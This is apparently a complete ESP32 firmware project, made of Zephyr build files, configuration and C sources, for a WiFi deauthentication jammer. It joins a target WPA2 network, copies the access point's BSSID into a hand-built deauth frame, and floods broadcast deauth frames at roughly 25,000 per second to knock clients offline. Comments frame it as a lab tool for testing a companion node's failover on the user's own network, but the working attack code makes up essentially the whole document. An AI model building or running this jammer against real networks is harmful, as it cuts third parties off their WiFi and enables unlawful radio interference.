## CMakeLists.txt
```
cmake_minimum_required(VERSION 3.20.0)

find_package(Zephyr REQUIRED HINTS $ENV{ZEPHYR_BASE})
project(jamshield_jammer C)

target_sources(app PRIVATE
    src/main.c
    src/jam_hal.c
)

# Share the node's header for the WiFi SSID/PSK constants.
target_include_directories(app PRIVATE ../esp32/include)
```

## prj.conf
```kconfig
# JamShield jammer (ESP32 #2) — WiFi for raw 802.11 injection.
CONFIG_MAIN_STACK_SIZE=4096
CONFIG_HEAP_MEM_POOL_SIZE=65536
CONFIG_PRINTK=y

# WiFi driver (so esp_wifi_init/start run).
CONFIG_NETWORKING=y
CONFIG_NET_L2_ETHERNET=y
CONFIG_WIFI=y
CONFIG_WIFI_ESP32=y
CONFIG_NET_L2_WIFI_MGMT=y
CONFIG_NET_IPV6=n
CONFIG_NET_IPV4=y

# net_mgmt events (association callback + iface status)
CONFIG_NET_MGMT=y
CONFIG_NET_MGMT_EVENT=y
CONFIG_NET_MGMT_EVENT_INFO=y

# Mirror the node's working WiFi bring-up so association is reliable.
CONFIG_NET_CONNECTION_MANAGER=y
CONFIG_NET_DHCPV4=y
CONFIG_ESP32_WIFI_STA_AUTO_DHCPV4=y

# Net buffers (the esp32 WiFi driver expects a healthy pool).
CONFIG_NET_PKT_RX_COUNT=10
CONFIG_NET_PKT_TX_COUNT=10
CONFIG_NET_BUF_RX_COUNT=16
CONFIG_NET_BUF_TX_COUNT=16

# The esp32 WiFi supplicant needs mbedTLS — without it the radio init faults.
CONFIG_MBEDTLS=y
CONFIG_MBEDTLS_ENABLE_HEAP=y
CONFIG_MBEDTLS_HEAP_SIZE=10000

# Logging
CONFIG_LOG=y
CONFIG_LOG_BACKEND_UART=y
CONFIG_LOG_DEFAULT_LEVEL=3
```

## boards/esp32_devkitc_wroom.overlay
```dts
/* Jammer needs the WiFi peripheral enabled for raw 802.11 TX. */
&wifi {
	status = "okay";
};
```

## src/main.c
```c
/*
 * JamShield jammer (ESP32 #2) — associate-then-inject deauth jammer.
 *
 * Joins the same AP as the victim node (so the WiFi driver is in its stable,
 * associated state and already on the AP's channel), learns the AP's BSSID, and
 * floods broadcast deauthentication frames while "jamming" is on. This kicks
 * the victim node off WPA2 (no-PMF) WiFi, triggering its real failover.
 *
 * Serial (USB):  s = start jamming,  x = stop,  ? = status.
 * Authorized educational/lab use on your OWN network only.
 */
#include <zephyr/kernel.h>
#include <zephyr/device.h>
#include <zephyr/drivers/uart.h>
#include <zephyr/net/net_if.h>
#include <zephyr/net/net_mgmt.h>
#include <zephyr/net/wifi_mgmt.h>
#include <zephyr/logging/log.h>

#include "jamshield.h"   /* JS_WIFI_SSID / JS_WIFI_PSK (shared with the node) */

LOG_MODULE_REGISTER(jammer, LOG_LEVEL_INF);

extern void jam_hal_set_bssid(const uint8_t *bssid);
extern int jam_hal_burst(int count);

#define BURST          64
#define RETRY_MS       6000

/* Target AP to attack. Defaults to the node's own network (JS_WIFI_SSID).
 * Override via run.ps1 -JamSsid/-JamPsk to test ANOTHER network YOU OWN or are
 * authorized (in writing) to test. Single named target only by design. */
#define JAM_TARGET_SSID JS_WIFI_SSID
#define JAM_TARGET_PSK  JS_WIFI_PSK

static struct net_if *wifi_iface;
static volatile bool associated;
static volatile bool want_jam;   /* set by 's' (RF on), cleared by 'x' (RF off) */
static struct net_mgmt_event_callback wifi_cb;
static const struct device *const console_dev =
	DEVICE_DT_GET(DT_CHOSEN(zephyr_console));

#define WIFI_EVENTS (NET_EVENT_WIFI_CONNECT_RESULT | NET_EVENT_WIFI_DISCONNECT_RESULT)

static void wifi_evt(struct net_mgmt_event_callback *cb, uint32_t event,
		     struct net_if *iface)
{
	ARG_UNUSED(iface);

	if (event == NET_EVENT_WIFI_CONNECT_RESULT) {
		const struct wifi_status *st = (const struct wifi_status *)cb->info;

		if (st && st->status) {
			printk("JAM: assoc failed (%d)\n", st->status);
			return;
		}
		struct wifi_iface_status s = {0};

		if (net_mgmt(NET_REQUEST_WIFI_IFACE_STATUS, wifi_iface, &s,
			     sizeof(s)) == 0) {
			jam_hal_set_bssid(s.bssid);
			printk("JAM: associated to %s, AP %02x:%02x:%02x:%02x:%02x:%02x ch%d\n",
			       JAM_TARGET_SSID, s.bssid[0], s.bssid[1], s.bssid[2],
			       s.bssid[3], s.bssid[4], s.bssid[5], s.channel);
		}
		associated = true;
	} else if (event == NET_EVENT_WIFI_DISCONNECT_RESULT) {
		associated = false;
		printk("JAM: disassociated\n");
	}
}

static void do_connect(void)
{
	static struct wifi_connect_req_params p;

	if (!net_if_is_admin_up(wifi_iface)) {
		(void)net_if_up(wifi_iface);
	}

	p.ssid = (const uint8_t *)JAM_TARGET_SSID;
	p.ssid_length = sizeof(JAM_TARGET_SSID) - 1;
	p.psk = (const uint8_t *)JAM_TARGET_PSK;
	p.psk_length = sizeof(JAM_TARGET_PSK) - 1;
	p.security = WIFI_SECURITY_TYPE_PSK;
	p.channel = WIFI_CHANNEL_ANY;
	p.band = WIFI_FREQ_BAND_2_4_GHZ;
	p.mfp = WIFI_MFP_OPTIONAL;

	int r = net_mgmt(NET_REQUEST_WIFI_CONNECT, wifi_iface, &p, sizeof(p));

	if (r) {
		printk("JAM: connect req = %d\n", r);
	}
}

static void serial_thread(void *p1, void *p2, void *p3)
{
	ARG_UNUSED(p1); ARG_UNUSED(p2); ARG_UNUSED(p3);
	uint8_t ch;

	while (1) {
		while (uart_poll_in(console_dev, &ch) == 0) {
			if (ch == 's' || ch == 'S') {
				want_jam = true;
				printk("JAM: RF ON (associate + deauth)\n");
			} else if (ch == 'x' || ch == 'X') {
				want_jam = false;
				printk("JAM: RF OFF (disconnect)\n");
			} else if (ch == '?') {
				printk("JAM: assoc=%d want_jam=%d\n", associated,
				       want_jam);
			}
		}
		k_msleep(30);
	}
}
K_THREAD_DEFINE(serial_tid, 1024, serial_thread, NULL, NULL, NULL, 7, 0, 0);

int main(void)
{
	printk("==== JamShield JAMMER (deauth) starting ====\n");

	wifi_iface = net_if_get_first_wifi();
	if (!wifi_iface) {
		printk("JAM: no WiFi iface\n");
		return 0;
	}

	net_mgmt_init_event_callback(&wifi_cb, wifi_evt, WIFI_EVENTS);
	net_mgmt_add_event_callback(&wifi_cb);

	printk("JAM: idle; send 's' to start RF deauth (it stays off WiFi until then)\n");

	uint64_t last_try = 0;
	uint32_t total = 0;

	while (1) {
		if (want_jam) {
			/* RF requested: associate to the victim AP, then flood. */
			if (!associated) {
				if (last_try == 0 ||
				    k_uptime_get() - last_try > RETRY_MS) {
					last_try = k_uptime_get();
					do_connect();
				}
				k_msleep(200);
			} else {
				int ret = jam_hal_burst(BURST);

				total += BURST;
				if (total % (BURST * 40U) == 0U) {
					printk("JAM: deauth total=%u last=%d\n",
					       total, ret);
				}
				/* Sleep (not just yield) so the lower-priority serial
				 * thread runs to process 'x'. Still ~25k frames/s. */
				k_msleep(2);
			}
		} else {
			/* Idle: stay OFF WiFi so we don't disrupt the victim node. */
			if (associated) {
				(void)net_mgmt(NET_REQUEST_WIFI_DISCONNECT,
					       wifi_iface, NULL, 0);
				printk("JAM: disconnected (idle)\n");
			}
			last_try = 0;
			k_msleep(150);
		}
	}
	return 0;
}
```

## src/jam_hal.c
```c
/*
 * JamShield jammer — Espressif HAL shim for raw 802.11 injection.
 *
 * Sends broadcast DEAUTH frames spoofed from the victim AP's BSSID. The jammer
 * is associated to the AP as a normal client (so the WiFi driver is in its
 * stable state and already tuned to the AP's channel); injected frames are not
 * received by the sender, so the jammer does not deauth itself — only the other
 * clients (the JamShield node) get kicked off.
 *
 * Isolated here because esp_wifi.h clashes with zephyr/net/wifi_mgmt.h.
 * Authorized educational/lab use on your OWN network only.
 */
#include <stdint.h>
#include <esp_wifi.h>

/* 802.11 deauthentication frame (26 bytes). SA/BSSID filled from the AP we
 * associate to (jam_hal_set_bssid). */
static uint8_t deauth[26] = {
	0xc0, 0x00,                         /* FC: deauth                     */
	0x00, 0x00,                         /* duration                       */
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, /* DA: broadcast (all clients)    */
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* SA  = AP BSSID                 */
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* BSSID = AP                     */
	0x00, 0x00,                         /* seq                            */
	0x07, 0x00,                         /* reason 7: class-3 frame        */
};

void jam_hal_set_bssid(const uint8_t *bssid)
{
	for (int i = 0; i < 6; i++) {
		deauth[10 + i] = bssid[i];
		deauth[16 + i] = bssid[i];
	}
}

/* Send `count` deauth frames on the current (associated) channel.
 * Returns the last esp_wifi_80211_tx result (0 = accepted). */
int jam_hal_burst(int count)
{
	int last = 0;

	for (int i = 0; i < count; i++) {
		last = (int)esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth),
					      false);
	}
	return last;
}
```
